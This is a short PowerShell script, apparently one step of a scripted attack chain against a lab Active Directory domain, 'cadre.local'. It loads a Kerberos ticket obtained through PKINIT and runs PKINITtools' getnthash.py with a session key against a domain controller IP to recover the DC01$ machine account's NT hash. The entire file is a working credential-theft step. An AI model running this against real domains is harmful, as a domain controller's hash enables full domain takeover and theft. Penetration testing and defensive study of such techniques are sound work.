# T008 chain: extract dc01$ NT hash from the PKINIT TGT via getnthash
$ErrorActionPreference = 'Continue'
$outDir = 'C:\Tools\cadre-attack'
$pk = "$outDir\pkinittools-src\PKINITtools-master"
$env:KRB5CCNAME = "$outDir\T008-dc01.ccache"

python "$pk\getnthash.py" -key 'cc33d769bf8c6d21cd9e2aca5a9822d73a4e1d89a0fdf3b75535cc09f7f831b3' -dc-ip 192.168.77.10 'cadre.local/dc01$' 2>&1 | ForEach-Object { Write-Output "NTHASH|$_" }
Write-Output 'GETNTHASH_DONE'
